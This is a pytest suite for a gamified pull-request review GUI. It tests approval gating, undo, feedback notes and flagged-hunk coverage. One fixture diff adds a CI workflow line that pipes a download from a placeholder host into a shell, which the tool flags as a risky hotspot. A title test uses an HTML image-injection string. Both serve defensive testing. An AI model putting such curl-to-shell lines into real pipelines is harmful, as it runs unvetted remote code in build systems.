from PySide6.QtCore import Qt
from pr_swipe.gui.app import Window
from tests.cards import make_card


class FakeStore:
    def __init__(self, cards):
        self.cards, self.marked, self.undone, self.opened, self.deep = cards, [], [], [], []
        self.recorded, self.one_offs, self.feedback = [], [], []
    def decided(self): return {}
    def returns(self): return []
    def in_train(self): return set()
    def metrics(self, days=7): return []
    def mark_decided(self, c, a, dwell, detail, one_off=False):
        self.marked.append((c["number"], a)); self.one_offs.append(one_off)
    def undo(self, c, reason="human"): self.undone.append((c["number"], reason))
    def record(self, c, action, note=None, hotspot=None, one_off=False):
        self.recorded.append((c["number"], action, note, hotspot and hotspot["file"], one_off))
    def request_open(self, url): self.opened.append(url)
    def request_deep_review(self, c): self.deep.append(c["number"])
    def rows(self): return self.feedback


class FakeClient:
    def __init__(self): self.sent = []
    def send(self, d): self.sent.append(d); return {"ok": True}


def make(qtbot, cards, clock=None, start=True):
    store, client = FakeStore(cards), FakeClient()
    t = {"now": 100.0}
    w = Window(store, client, load_cards=lambda: store.cards, clock=clock or (lambda: t["now"]), undo_ms=0)
    qtbot.addWidget(w)
    if start:
        w.begin_quest()
    return w, store, client, t


def test_right_approves_calm_card_and_sends_pinned_decision(qtbot):
    w, store, client, _ = make(qtbot, [make_card()])
    qtbot.keyClick(w, Qt.Key_Right)
    w.flush_pending()
    assert client.sent[0]["action"] == "approve" and client.sent[0]["head_sha"] == "a" * 40
    assert store.marked == [(1, "approve")]


def test_risky_card_needs_second_press_after_dwell(qtbot):
    card = make_card(ci={"state": "failure", "failing": ["t"]})
    w, store, client, t = make(qtbot, [card])
    qtbot.keyClick(w, Qt.Key_Right)
    qtbot.keyClick(w, Qt.Key_Right)          # too soon: dwell < 2 s
    w.flush_pending()
    assert client.sent == []
    t["now"] += 3
    qtbot.keyClick(w, Qt.Key_Right)
    w.flush_pending()
    assert client.sent and client.sent[0]["action"] == "approve"


def test_undo_cancels_pending_decision(qtbot):
    w, store, client, _ = make(qtbot, [make_card()])
    w.undo_ms = 60000
    qtbot.keyClick(w, Qt.Key_Right)
    qtbot.keyClick(w, Qt.Key_U)
    w.flush_pending()
    assert client.sent == [] and store.undone == [(1, "human")]


def test_up_requests_deep_review_and_down_toggles_detail(qtbot):
    w, store, client, _ = make(qtbot, [make_card(), make_card(number=2)])
    qtbot.keyClick(w, Qt.Key_Up)
    assert store.deep == [1] and w.current()["number"] == 2
    qtbot.keyClick(w, Qt.Key_Down)
    assert w.detail_open


def test_external_repo_card_opens_browser_instead_of_deciding(qtbot):
    w, store, client, _ = make(qtbot, [make_card(can_merge=False)])
    qtbot.keyClick(w, Qt.Key_Right)
    w.flush_pending()
    assert client.sent == [] and store.opened == ["https://github.com/o/r/pull/1"]


def test_card_text_is_rendered_as_plain_text(qtbot):
    w, *_ = make(qtbot, [make_card(title="<b>bold</b><img src=x>")])
    assert w.title_label.textFormat() == Qt.PlainText


class RefusingClient(FakeClient):
    def send(self, d): self.sent.append(d); return {"ok": False, "error": "nope"}


def test_executor_refusal_is_logged_as_refused(qtbot):
    w, store, _, _ = make(qtbot, [make_card()])
    w.client = RefusingClient()
    qtbot.keyClick(w, Qt.Key_Right)
    w.flush_pending()
    assert store.undone == [(1, "refused")]


def hot(file="f.py"):
    return {"source": "ai", "file": file, "hunk": "@@ -1 +1 @@", "lines": "+x", "why": "w", "severity": "high"}


def test_note_attaches_to_picked_hotspot(qtbot):
    w, store, _, _ = make(qtbot, [make_card(hotspots=[hot("a.py"), hot("b.py")])])
    w.ask_item = lambda *a: 2
    w.ask_text = lambda *a: "b.py swallows the error"
    qtbot.keyClick(w, Qt.Key_T)
    assert store.recorded == [(1, "note", "b.py swallows the error", "b.py", False)]


def test_missed_and_cancelled_feedback(qtbot):
    w, store, _, _ = make(qtbot, [make_card(hotspots=[hot()])])
    w.ask_text = lambda *a: None
    qtbot.keyClick(w, Qt.Key_M)
    assert store.recorded == []
    w.ask_text = lambda *a: "race in train.py:40"
    qtbot.keyClick(w, Qt.Key_M)
    assert store.recorded == [(1, "missed", "race in train.py:40", None, False)]


def test_one_off_flag_rides_on_decision_and_resets(qtbot):
    w, store, _, _ = make(qtbot, [make_card(), make_card(number=2)])
    qtbot.keyClick(w, Qt.Key_X)
    qtbot.keyClick(w, Qt.Key_Right)
    qtbot.keyClick(w, Qt.Key_S)
    assert store.one_offs == [True] and store.recorded == [(2, "skip", None, None, False)]


def test_quest_start_screen_gates_the_first_key(qtbot):
    w, store, client, _ = make(qtbot, [make_card(), make_card(number=2, hotspots=[hot()])], start=False)
    assert "quest" in w.title_label.text().lower() and "2 encounters" in w.context_label.text()
    qtbot.keyClick(w, Qt.Key_Right)          # begins the quest, decides nothing
    w.flush_pending()
    assert client.sent == [] and w.quest_started
    assert "encounter 1/2" in w.encounter_label.text()


def test_encounter_header_and_sharp_eye_toast(qtbot):
    card = make_card(ci={"state": "failure", "failing": ["t"]})
    w, store, _, _ = make(qtbot, [card])
    assert "Dragon" in w.encounter_label.text()
    w.ask_text = lambda *a: "off-by-one in train.py"
    qtbot.keyClick(w, Qt.Key_M)
    assert "Sharp eye" in w.footer.text()


def test_quest_complete_shows_recap_of_care(qtbot):
    w, store, client, t = make(qtbot, [make_card()])
    store.feedback = [{"ts": t["now"], "key": "k", "action": "missed", "override": False, "ai": {}},
                      {"ts": t["now"], "key": "o/r#1@" + "a" * 40, "action": "approve", "override": False,
                       "ai": {"recommendation": "approve"}}]
    qtbot.keyClick(w, Qt.Key_Right)
    w.flush_pending()
    store.cards = []
    w.reload()
    text = w.title_label.text() + w.context_label.text()
    assert "1 sharp-eye find" in text and "1 approved" in text


class FakeView:
    """Stands in for the verified-mirror GitView: files and per-file diffs."""
    DIFFS = {".github/workflows/ci.yml": "@@ -1 +1 @@\n-run: test\n+run: curl x | sh",
             "src/train.py": "@@ -1,2 +1,2 @@\n ctx\n-a\n+b\n@@ -40 +40 @@\n-retry()\n+retry(force=True)",
             "src/util.py": "@@ -1 +1 @@\n-x\n+y", "vendor/lib.go": "@@ -1 +1 @@\n-v1\n+v2"}
    def files(self, base, head):
        return [{"path": p, "status": "M", "binary": False, "additions": 1, "deletions": 1} for p in self.DIFFS]
    def file_diff(self, base, head, path): return self.DIFFS[path]


def review_card():
    spots = [{"source": "rule", "rule": "ci-workflow", "file": ".github/workflows/ci.yml", "hunk": "@@ -1 +1 @@",
              "lines": "+run: curl x | sh"},
             {"source": "ai", "file": "src/train.py", "hunk": "@@ -40 +40 @@", "lines": "+retry(force=True)",
              "why": "retries without re-checking head", "severity": "high"}]
    c = make_card(hotspots=spots)
    c.update(_verified=True, _view=FakeView(), _commits=[{"sha": "c" * 40, "subject": "feat: retry"}],
             _record={"merge_base": "b" * 40, "head_sha": "a" * 40, "body": "Retry merges on 409.\n\nDetails."})
    return c


def test_review_view_orders_files_and_collapses_low_signal(qtbot):
    w, *_ = make(qtbot, [review_card()])
    rows = [w.files.item(i).text() for i in range(w.files.count())]
    assert rows[0].startswith("🚩 .github/workflows/ci.yml") and rows[1].startswith("⚠ high src/train.py")
    assert rows[-1].startswith("▸ 1 low-signal") and not any("vendor/lib.go" in r for r in rows)
    assert "▶ 🚩 rule: ci-workflow" in w.body.toPlainText()
    assert "Intent (PR body, verified): Retry merges on 409." in w.context_label.text()


def test_j_moves_through_files_and_expands_low_signal(qtbot):
    w, *_ = make(qtbot, [review_card()])
    qtbot.keyClick(w, Qt.Key_J)
    assert "retry(force=True)" in w.body.toPlainText()
    for _ in range(3):
        qtbot.keyClick(w, Qt.Key_J)
    assert "+v2" in w.body.toPlainText()
    assert any("vendor/lib.go" in w.files.item(i).text() for i in range(w.files.count()))


def test_dragon_approve_waits_for_every_flagged_hunk(qtbot):
    w, store, client, t = make(qtbot, [review_card()])
    t["now"] += 60                            # time alone does not open the gate
    qtbot.keyClick(w, Qt.Key_Right); qtbot.keyClick(w, Qt.Key_Right)
    w.flush_pending()
    assert client.sent == [] and "src/train.py" in w.footer.text()
    qtbot.keyClick(w, Qt.Key_N)
    qtbot.keyClick(w, Qt.Key_N)
    assert "▶ ⚠ AI high: retries without re-checking head" in w.body.toPlainText()
    assert "flagged hunks 2/2" in w.coverage_label.text()
    qtbot.keyClick(w, Qt.Key_Right)
    w.flush_pending()
    assert client.sent and client.sent[0]["action"] == "approve"
